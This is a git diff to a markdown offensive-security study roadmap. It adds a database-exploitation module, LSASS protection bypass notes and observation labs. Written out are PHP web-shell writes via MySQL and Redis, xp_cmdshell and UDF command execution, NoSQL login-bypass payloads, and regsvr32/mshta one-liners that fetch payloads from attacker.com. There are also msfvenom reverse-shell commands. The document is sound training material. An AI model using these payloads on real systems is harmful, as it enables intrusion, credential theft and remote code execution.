@@ -1,4 +1,4 @@
-+# Phase 2: Offensive Core
+# Phase 2: Offensive Core
 
 ---
 
@@ -24,10 +24,10 @@
 > Every attack you execute must be documented. Required artifacts:
 >
 > - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
-> - **Tool output** — Nmap scans, Burp captures, Metasploit session logs saved to files
+> - **Tool output** — [Nmap](../Tools/Nmap.md) scans, Burp captures, [Metasploit](../Tools/Metasploit_Framework.md) session logs saved to files
 > - **Attack chain diagrams** showing the kill chain for each compromise
 > - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
-> - **Git commits** — commit after every lab session with descriptive messages
+ > - **Git commits** — commit after every lab session with descriptive messages
 >
 > _By the end of Phase 2, you should have 10+ documented attack chains in your repository._
 
@@ -48,8 +48,7 @@
 - [Part 5: Scanning](#part-5-scanning)
   - [Stage 1: Host Discovery & Network Topology (The "Roll Call")](#stage-1-host-discovery-network-topology-the-roll-call)
   - [Stage 2: Port, Service & Protocol Enumeration (The "Door Check")](#stage-2-port-service-protocol-enumeration-the-door-check)
-  - [Stage 3: Defense & Co
-    nfiguration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
+  - [Stage 3: Defense & Configuration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
   - [Stage 4: Vulnerability Association & Attack Mapping](#stage-4-vulnerability-association-attack-mapping)
   - [Stage 5: Stealth & Evasion Techniques](#stage-5-stealth-evasion-techniques)
   - [Stage 6: Advanced Scanning Techniques](#stage-6-advanced-scanning-techniques)
@@ -61,6 +60,13 @@
   - [Stage 4: Database & Application Enumeration](#stage-4-database-application-enumeration)
   - [Stage 5: Attack Surface Consolidation & Enumeration OpSec](#stage-5-attack-surface-consolidation-enumeration-opsec)
   - [Lab Progression (Part 6: Enumeration)](#lab-progression-part-6-enumeration)
+- [Part 6B: Database Security](#part-6b-database-security) ← NEW
+  - [Stage 1: Database Enumeration & Fingerprinting](#part-6b-stage-1-database-enumeration-fingerprinting)
+  - [Stage 2: Relational Database Exploitation](#part-6b-stage-2-relational-database-exploitation)
+  - [Stage 3: NoSQL & Modern Database Attacks](#part-6b-stage-3-nosql-modern-database-attacks)
+  - [Stage 4: Database Privilege Escalation](#part-6b-stage-4-database-privilege-escalation)
+  - [Stage 5: Database Auditing & Defence](#part-6b-stage-5-database-auditing-defence)
+  - [Lab Progression (Part 6B: Database Security)](#part-6b-lab-progression)
 - [Part 31: Password Cracking & Hash Analysis](#part-31-password-cracking-hash-analysis)
   - [Stage 1: Hash Identification & Acquisition](#stage-1-hash-identification-acquisition)
   - [Stage 2: Cracking Methodology & Tools](#stage-2-cracking-methodology-tools)
@@ -183,7 +189,7 @@
 
 - [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.
 
-- [ ] **Web Content Discovery:** Run **ffuf or Gobuster** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
+- [ ] **Web Content Discovery:** Run **[ffuf](../Tools/ffuf.md) or [Gobuster](../Tools/Gobuster.md)** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
 
 - [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.
 
@@ -198,7 +204,7 @@
 > [!TIP]
 > **Goal:** Understand the defensive "brain" of the target.
 
-- [ ] **Traffic Analysis:** If vantage is gained, use **Wireshark** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
+- [ ] **Traffic Analysis:** If vantage is gained, use **[Wireshark](../Tools/Wireshark.md)** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
 
 - [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down your operation immediately.
 
@@ -221,7 +227,7 @@
 
 - [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.
 
-- [ ] **SNMP Enumeration:** Query **SNMP community strings** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
+- [ ] **SNMP Enumeration:** Query **SNMP community [strings](../Tools/strings.md)** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
 
 - [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.
 
@@ -325,7 +331,7 @@
 
 - [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.
 
-- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `hping3 --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
+- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[hping3](../Tools/hping3.md) --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
 
 - [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.
 
@@ -382,8 +388,6 @@
 
 - [ ] **Attack Surface Selection:** Match findings to your known **Common Attacks**—e.g., **SQL Injection** for web servers or **Buffer Overflows** for legacy binaries.
 
-- [ ] **Unintended Tool Research:** For discovered OS versions, research **LOLBAS, GTFOBins, or WADCOMS** to leverage existing system binaries for lateral movement. _(See Part 7, Phase 2 for canonical LOLBAS/GTFOBins coverage.)_
-
 - [ ] **Traffic Intelligence:** Finalize your plan by inspecting **Packet Captures** for cleartext protocols or weak encryption that allows for **MITM** or **Replay Attacks**.
 
 - [ ] **Cluster & Correlate:** Group hosts by **banners/JA3/favicons** and map versions to likely **CVEs** before exploitation.
@@ -409,7 +413,7 @@
 
 - [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.
 
-- [ ] **Packet Manipulation:** Craft **custom packets** with **Scapy** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
+- [ ] **Packet Manipulation:** Craft **custom packets** with **[Scapy](../Tools/Scapy.md)** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
 
 ---
 
@@ -464,9 +468,9 @@
 > [!TIP]
 > **Goal:** Extract version, configuration, and identity information from each discovered service.
 
-- [ ] **Banner Grabbing:** Use **Netcat, Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
+- [ ] **Banner Grabbing:** Use **[Netcat](../Tools/Netcat.md), Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
 
-- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, CrackMapExec** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
+- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [NetExec](../Tools/NetExec.md) (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
 
 - [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.
 
@@ -487,7 +491,7 @@
 
 - [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.
 
-- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, BloodHound** to map **domain trusts, group membership, SPNs, delegation**.
+- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [BloodHound](../Tools/BloodHound.md)** to map **domain trusts, group membership, SPNs, delegation**.
 
 - [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.
 
@@ -567,6 +571,201 @@
 
 ---
 
+<a id="part-6b-database-security"></a>
+
+## Part 6B: Database Security
+
+> [!NOTE]
+> **Navigational Note — Why Part 6B Is Here:** Part 6B was added to Phase 2 during the roadmap's v2.0 audit because database exploitation surfaces appear across Phases 2, 4, 6, and 7 but had no dedicated systematic module. SQLi (Part 17, Phase 4) covers injection attacks against web applications that query databases — it does NOT cover direct database engine exploitation. Part 6B fills that gap. Complete this before Part 31 and Part 7.
+
+> [!IMPORTANT]
+> **Prerequisites:** Part 6 (Enumeration) — specifically Stage 4 (Database & Application Enumeration). You should already be able to identify running database services and version-fingerprint them. This Part teaches you what to do after enumeration.
+
+<a id="part-6b-stage-1-database-enumeration-fingerprinting"></a>
+
+### **Stage 1: Database Enumeration & Fingerprinting**
+
+> [!TIP]
+> **Goal:** Identify database engine, version, authentication mechanism, and attack surface before attempting exploitation.
+
+- [ ] **Service Discovery:** Scan for database services on standard and non-standard ports:
+  - MySQL / MariaDB: 3306 | MSSQL: 1433 (TCP), 1434 (UDP browser) | PostgreSQL: 5432
+  - Oracle: 1521 (TNS) | MongoDB: 27017 | Redis: 6379 | Elasticsearch: 9200 (HTTP), 9300 (cluster)
+  - Use: `nmap -sV -p 1433,3306,5432,1521,27017,6379,9200 <target>`
+
+- [ ] **Version Fingerprinting & Banner Grabbing:**
+  - MySQL: `nmap --script mysql-info -p 3306 <target>` or `mysql -h <target> -u root`
+  - MSSQL: `nmap --script ms-sql-info -p 1433 <target>` or `sqlcmd -S <target> -Q "SELECT @@VERSION"`
+  - PostgreSQL: `psql -h <target> -U postgres`
+  - Redis: `redis-cli -h <target> PING` then `INFO server`
+  - Elasticsearch: `curl http://<target>:9200/`
+
+- [ ] **Default Credentials Testing:**
+  - MySQL: `root`/(empty), `root`/`root`, `root`/`password`
+  - MSSQL: `sa`/(empty), `sa`/`sa`
+  - PostgreSQL: `postgres`/`postgres`, `postgres`/(empty)
+  - Oracle: `sys`/`change_on_install`, `system`/`manager`, `scott`/`tiger`
+  - MongoDB/Redis (older): no authentication by default — direct connection succeeds
+  - Use `nmap --script=<db>-brute` for automated default credential testing
+
+- [ ] **Schema Enumeration (Authenticated):**
+  - MySQL: `SELECT * FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');`
+  - MSSQL: `SELECT name FROM master.dbo.sysdatabases;` then `USE <db>; SELECT * FROM information_schema.tables;`
+  - PostgreSQL: `\l`, `\c <db>`, `\dt`
+  - Oracle: `SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM');`
+
+---
+
+<a id="part-6b-stage-2-relational-database-exploitation"></a>
+
+### **Stage 2: Relational Database Exploitation**
+
+> [!TIP]
+> **Goal:** Escalate from database access to OS command execution and credential extraction.
+
+**MySQL / MariaDB:**
+
+- [ ] **FILE Privilege Exploitation:** With `FILE` privilege, read OS files: `SELECT LOAD_FILE('/etc/passwd');` and write files: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` (requires `secure_file_priv` to be empty or set to a writable path).
+
+- [ ] **User Defined Functions (UDFs):** Upload a malicious shared library to the plugin directory, create a UDF from it, and execute OS commands:
+  ```sql
+  SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+  SELECT sys_exec('id > /tmp/pwned.txt');
+  ```
+
+- [ ] **MySQL Hash Extraction:** `SELECT user, authentication_string FROM mysql.user;` — MySQL 8+ uses `caching_sha2_password`. Crack with `hashcat -m 7401`.
+
+**MSSQL:**
+
+- [ ] **`xp_cmdshell` OS Command Execution:**
+  ```sql
+  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+  EXEC xp_cmdshell 'whoami';
+  EXEC xp_cmdshell 'powershell -EncodedCommand <base64_payload>';
+  ```
+
+- [ ] **Linked Server Pivoting:** Query remote databases via linked server definitions — execute commands on linked servers with `EXEC ('EXEC xp_cmdshell ''whoami''') AT [linked_server_name];`. Enumerate: `SELECT * FROM sys.servers WHERE is_linked = 1;`
+
+- [ ] **CLR Assemblies:** Load a .NET assembly as a stored procedure to execute arbitrary .NET code (requires `clr enabled = 1` and sysadmin).
+
+- [ ] **Impersonation (`EXECUTE AS`):** `EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT;` — works if the current login has `IMPERSONATE` permission on the target login.
+
+- [ ] **MSSQL Hash Extraction:** `SELECT name, password_hash FROM sys.sql_logins;` (requires sysadmin). Crack with `hashcat -m 1731`.
+
+**PostgreSQL:**
+
+- [ ] **`COPY TO PROGRAM` — OS Command Execution:** `COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';` (superuser only)
+
+- [ ] **`pg_read_file` — File Read:** `SELECT pg_read_file('/etc/passwd', 0, 100000);`
+
+- [ ] **`lo_export` — File Write via Large Objects:** Write arbitrary content to arbitrary paths using `lo_from_bytea` + `lo_export`.
+
+**Oracle:**
+
+- [ ] **UTL_FILE / Java Stored Procedures:** File read/write via UTL_FILE directory objects. OS command execution via Java stored procedures if Java is enabled and permissions granted.
+
+- [ ] **DB Links:** Enumerate with `SELECT * FROM dba_db_links;` — execute queries across links: `SELECT * FROM table@remote_db_link;`
+
+---
+
+<a id="part-6b-stage-3-nosql-modern-database-attacks"></a>
+
+### **Stage 3: NoSQL & Modern Database Attacks**
+
+> [!TIP]
+> **Goal:** Attack non-relational databases — different injection syntax, different attack surfaces, different default security postures.
+
+**MongoDB:**
+
+- [ ] **Unauthenticated Access:** MongoDB < 2.6 and many misconfigured deployments run without authentication. Test: `mongosh <target>:27017`. Enumerate: `show dbs; use admin; db.system.users.find();`
+
+- [ ] **NoSQL Injection (via Web App):** When user input reaches MongoDB queries without sanitisation:
+  - Login bypass: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` — matches any non-empty username/password
+  - Data extraction: `{"username": {"$regex": "admin"}, "password": {"$gt": ""}}` — regex enumeration
+
+- [ ] **`$ne` Authentication Bypass:** `db.users.find({"username": "admin", "password": {"$ne": "wrong"}})` — finds admin where password is NOT "wrong" (always matches if admin exists).
+
+**Redis:**
+
+- [ ] **Unauthenticated Access:** Redis defaults to no auth on localhost. When exposed externally: `redis-cli -h <target> INFO server`
+
+- [ ] **Config Rewrite RCE (Web Shell):**
+  ```bash
+  redis-cli -h <target> CONFIG [SET](../Tools/SET.md) dir /var/www/html
+  redis-cli -h <target> CONFIG SET dbfilename shell.php
+  redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
+  redis-cli -h <target> SAVE
+  ```
+
+- [ ] **SSH Key Injection:** If Redis runs as a user with an SSH directory, inject your public key into `authorized_keys` via `CONFIG SET dir` + `CONFIG SET dbfilename authorized_keys` + `SET sshkey "$(cat ~/.ssh/id_rsa.pub)"` + `SAVE`.
+
+- [ ] **Module Loading RCE:** Redis 4.0+ supports `MODULE LOAD /path/to/malicious.so` for arbitrary code execution.
+
+**Elasticsearch:**
+
+- [ ] **Unauthenticated Data Access (< 8.0):** `curl http://<target>:9200/_cat/indices?v` to list indices. `curl http://<target>:9200/<index>/_search?pretty` to dump data.
+
+---
+
+<a id="part-6b-stage-4-database-privilege-escalation"></a>
+
+### **Stage 4: Database Privilege Escalation**
+
+> [!TIP]
+> **Goal:** Move from low-privileged DB access to OS command execution and system-level access.
+
+- [ ] **Vertical Escalation Within DB Engine:**
+  - MySQL: Low-priv user → compromise MySQL root → grant `FILE` privilege → read `/etc/shadow` or write web shell
+  - MSSQL: `db_datareader` → find TRUSTWORTHY database owned by sysadmin → escalate via `CREATE PROCEDURE` in TRUSTWORTHY context
+  - Check MSSQL: `SELECT name, is_trustworthy_on FROM sys.databases;`
+
+- [ ] **Token Impersonation via DB Service Account (Windows):** MSSQL often runs with `SeImpersonatePrivilege`. After `xp_cmdshell` RCE: `xp_cmdshell 'whoami /priv'`. If SeImpersonatePrivilege present, escalate to SYSTEM with PrintSpoofer or GodPotato.
+
+- [ ] **Cross-Database Escalation (MSSQL):** A `db_owner` in a TRUSTWORTHY database can escalate to `sysadmin`: `EXECUTE AS USER = 'dbo'; EXEC master..xp_cmdshell 'whoami';`
+
+---
+
+<a id="part-6b-stage-5-database-auditing-defence"></a>
+
+### **Stage 5: Database Auditing & Defence**
+
+> [!TIP]
+> **Goal:** Understand the defender-side mitigations that block the attacks above.
+
+- [ ] **Least Privilege Service Accounts:** Application DB users should only have SELECT/INSERT/UPDATE on specific tables — never `FILE`, `xp_cmdshell`, `SUPER`. `xp_cmdshell` should be disabled by default (check: `SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`). MySQL `secure_file_priv` should not be empty.
+
+- [ ] **Network Isolation:** DB ports (3306, 1433, 5432, 27017, 6379) should not be reachable from the internet or workstation subnets — only from dedicated application server subnets.
+
+- [ ] **Authentication Hardening:**
+  - MySQL: Disable `test` database, remove anonymous accounts, enforce password complexity
+  - MSSQL: Prefer Windows Authentication over SQL Authentication
+  - Redis: Set `requirepass <strong_password>` and bind to `127.0.0.1` only
+  - MongoDB: Enable `auth = true` in `mongod.conf` with role-based users
+
+- [ ] **Audit Logging:**
+  - MSSQL: SQL Server Audit, Extended Events — log `xp_cmdshell`, `EXECUTE AS`, linked server queries, `CREATE PROCEDURE`
+  - MySQL: `general_log = ON`; `audit_log` plugin for compliance
+  - PostgreSQL: `log_statement = 'all'` or `pgaudit` extension
+
+<a id="part-6b-lab-progression"></a>
+
+### **Lab Progression (Part 6B: Database Security)**
+
+| Level | Task | Deliverable |
+|-------|------|-------------|
+| 1 | Local MySQL lab: create a low-priv user, escalate via `FILE` privilege abuse | Step-by-step attack documentation |
+| 2 | MSSQL in a lab VM: enable `xp_cmdshell`, execute OS commands, extract hashes | Command log + hash extraction proof |
+| 3 | Redis without auth: RCE via config rewrite (web shell method) | Working web shell demonstration |
+| 4 | MongoDB without auth: enumerate collections, test `$ne` auth bypass | Injection payload documentation |
+| 5 | Full DB attack chain on HackTheBox/VulnHub machine with exposed DB service | Pentest-style report: enumeration → exploitation → escalation |
+
+> [!IMPORTANT]
+> **Move-On Gate:** You can enumerate database services, identify engine and version, test default credentials, achieve OS command execution on at least one DB engine (MySQL or MSSQL), and explain the defensive controls that would prevent each attack. Document every command and finding.
+
+---
+
 <a id="part-31-password-cracking-hash-analysis"></a>
 
 ## Part 31: Password Cracking & Hash Analysis
@@ -596,9 +795,9 @@
 > [!TIP]
 > **Goal:** Apply the right technique to each hash type.
 
-- [ ] **Hashcat Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
+- [ ] **[Hashcat](../Tools/Hashcat.md) Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
 
-- [ ] **John the Ripper:** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
+- [ ] **[John the Ripper](../Tools/John_the_Ripper.md):** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
 
 - [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.
 
@@ -619,7 +818,7 @@
 > [!TIP]
 > **Goal:** Crack hashes captured from real network protocols.
 
-- [ ] **NTLM / NetNTLMv2:** Capture with **Responder, ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
+- [ ] **NTLM / NetNTLMv2:** Capture with **[Responder](../Tools/Responder.md), ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
 
 - [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.
 
@@ -692,7 +891,7 @@
 
 **Credential Assault:**
 
-- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling**.
+- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[Hydra](../Tools/Hydra.md)** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[Hashcat](../Tools/Hashcat.md)** + **[John the Ripper](../Tools/John_the_Ripper.md)** for offline hash cracking.
 
 - [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.
 
@@ -718,7 +917,7 @@
 
 > **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Part 9: Sniffing & Spoofing** (Phases 3–4). WiFi evil twin attacks are covered in **Part 21: Wireless Pentesting**. The techniques here focus on using these as delivery mechanisms for social engineering — review Part 9 first.
 
-- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **tcpdump/Wireshark**.
+- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[tcpdump](../Tools/tcpdump.md)/Wireshark**.
 
 ---
 
@@ -736,7 +935,7 @@
 
 **Step 0 — Enumeration (Always First):**
 
-- [ ] **Automated Enumeration:** Run **winPEAS** (`winpeas.exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
+- [ ] **Automated Enumeration:** Run **winPEAS** (`[winpeas](../Tools/WinPEAS.md).exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
 
 - [ ] **Manual Baseline Commands:** On foothold, immediately run:
   - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
@@ -764,7 +963,7 @@
 **Vector 2: DLL Hijacking**
 
 - [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
-  - Discovery: **Procmon** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
+  - Discovery: **[Procmon](../Tools/Procmon.md)** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
 
 - [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.
 
@@ -880,7 +1079,7 @@
 **Linux Privilege Escalation:**
 
 > [!IMPORTANT]
-> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **LinPEAS** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
+> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[LinPEAS](../Tools/LinPEAS.md)** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
 
 **Step 0 — Enumeration (Always First):**
 
@@ -1096,6 +1295,18 @@
 
 - [ ] **AppArmor/SELinux Bypass:** Disable or escape **mandatory access controls**.
 
+- [ ] **Windows Credential Guard & RunAsPPL Bypass (Awareness):** Enterprise environments deploy these as primary mitigations against LSASS credential dumping. Understand both before attempting credential extraction on a modern Windows target:
+  - **Windows Credential Guard** (enabled via Hyper-V VBS): Isolates NTLM hashes and Kerberos TGTs in a UEFI-secured Virtual Trust Level (VTL1) enclave. Standard LSASS dumps via mimikatz/procdump fail — the credential material is not in the LSASS process memory accessible from VTL0. Detection: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\LSA').LsaCfgFlags` — value 1 or 2 means enabled. If Credential Guard is active, pivot to alternative credential sources (DPAPI blobs, cached credentials, Kerberos relay).
+  - **RunAsPPL (Protected Process Light):** Registry: `HKLM\SYSTEM\CurrentControlSet\Control\LSA\RunAsPPL = 1`. Makes LSASS a protected process — standard user-land handles are denied even with SeDebugPrivilege. Bypass techniques: PPL driver abuse (load a legitimately signed but vulnerable kernel driver to strip PPL protection — PPLdump/ProtectedProcesses), direct syscall LSASS access via LSA callbacks, or `comsvcs.dll MiniDump` method which may still succeed on older platforms. Deeper bypass techniques live in Phase 7 Part 42.
+  - **Operational check before dumping:** Always verify Credential Guard and PPL status before attempting LSASS. A failed dump with no bypass plan wastes time and generates high-confidence EDR telemetry.
+
+- [ ] **AppLocker / WDAC Bypass via LOLBAS:** Application whitelisting (AppLocker via GPO, WDAC via Intune/GPO) restricts executable paths but can be bypassed via trusted Windows binaries:
+  - **AppLocker bypass techniques:** `MSBuild.exe` (compiles and executes inline C#), `regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll` (scriptlet execution, "Squiblydoo"), `mshta.exe http://attacker.com/payload.hta` (HTA execution), `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` (uninstalls trigger code execution)
+  - **WDAC bypass techniques:** WDAC is harder — it operates at kernel level and blocks drivers. Bypass requires abusing WDAC policy exceptions: script enforcement gaps in certain PowerShell language modes, using `rundll32.exe` with allowed DLLs, or targeting allowed installer paths via custom MSI.
+  - **Detection:** Check AppLocker policy with `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`. Check WDAC with `Get-CIPolicy -FilePath "$env:SystemRoot\System32\CodeIntegrity\CIPolicies\Active\*"`.
+  - **LOLBAS reference:** [lolbas-project.github.io](https://lolbas-project.github.io) — filter by "Execute" function type for current bypass candidates.
+  - **Canonical coverage:** Full LOLBAS/GTFOBins methodology is in Phase 7 Part 42 (Offensive Development). This entry focuses on awareness and immediate tactical applicability.
+
 **Anti-Forensics:**
 
 - [ ] **File Deletion:** Use **shred, srm, cipher /w** for **secure wiping** of tools and artifacts.
@@ -1229,6 +1440,10 @@
 
 ---
 
+---
+
+---
+
 <a id="part-8-malware-weaponization"></a>
 
 ## Part 8: Malware & Weaponization
@@ -1286,7 +1501,9 @@
 
 - [ ] **Staged Payload Architecture:** Understand the difference between **stageless** (one-shot complete payload) and **staged** (stager fetches the full payload at runtime) delivery — know why staged reduces initial payload size but requires an active C2 listener. Use `msfvenom` to generate both and compare their byte sizes and detection rates against VirusTotal (educational only — never upload customer/lab-specific payloads).
 
-- [ ] **Framework-Managed C2:** Deploy **Sliver** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.
+- [ ] **Framework-Managed C2:** Deploy **[Sliver](../Tools/Sliver.md)** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.
+
+> **🔬 Observation Lab (Stage 2):** Run EICAR test file (`https://www.eicar.org/download/eicar.com`) through VirusTotal and note detection rate. Then generate an msfvenom stageless payload (`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o stageless.exe`) and a staged payload (`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o staged.exe`). Compare: (1) file sizes, (2) VirusTotal detection rates for both. Record which AV engines flag them and whether detections are signature-based or heuristic. Never execute either payload outside a controlled lab VM with no network access.
 
 ---
 
@@ -1310,6 +1527,8 @@
 
 - [ ] **Memory-Based Evasion Concepts:** Understand *what* sleep obfuscation, call stack spoofing, and indirect syscalls do — each is a technique that makes a beacon harder to detect during memory scanning. Implementation and lab practice in Part 42.
 
+> **🔬 Observation Lab (Stage 3):** In a Windows sandbox VM: (1) Run `Procmon` (Sysinternals), filter on `powershell.exe`. Execute `powershell -Command "Write-Host hello"` and observe the API calls. Now run `powershell -EncodedCommand` with a base64-encoded version of the same command. Compare the Procmon output — same result, different invocation path. This is the "encoded = suspicious" detection signal that AMSI catches. Document what `ScriptBlock Logging` Event ID 4104 shows for each.
+
 ---
 
 <a id="stage-4-persistence-escalation-entrenchment"></a>
@@ -1327,6 +1546,8 @@
 - [ ] **Privileged Persistence Concepts:** Understand that kernel-level and UEFI-level persistence (bootkits, driver implants) exist and require privileged access plus deep OS internals knowledge — covered in Part 28. Recognizing their artifacts is the skill to acquire here.
 
 - [ ] **Defense Disabling (Conceptual):** Understand that advanced malware terminates AV/EDR processes or disables tamper protection when running as SYSTEM — recognizing this behavior in logs is the defender-relevant skill; the implementation is in Part 42.
+
+> **🔬 Observation Lab (Stage 4):** In a Windows sandbox VM with Sysmon installed: (1) Create a scheduled task with `schtasks /create /sc onlogon /tn "Updater" /tr "calc.exe"`. (2) Open Event Viewer → Applications and Services Logs → Microsoft → Windows → TaskScheduler → Operational. Find the task creation event (Event ID 106). Document: what the event records, what fields an analyst would use to detect malicious scheduled tasks, and what `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` looks like in Autoruns. Delete the task when done.
 
 ---
 
@@ -1347,6 +1568,8 @@
 - [ ] **Anti-Forensics Counter-Detection:** Know the defender techniques that defeat anti-forensics: **Write-Protect + Memory Forensics (Volatility)**, **SIEM log forwarding**, **EDR telemetry that bypasses local log clearing**, **backup snapshot retention**, and **network forensic reconstruction from PCAP**.
 
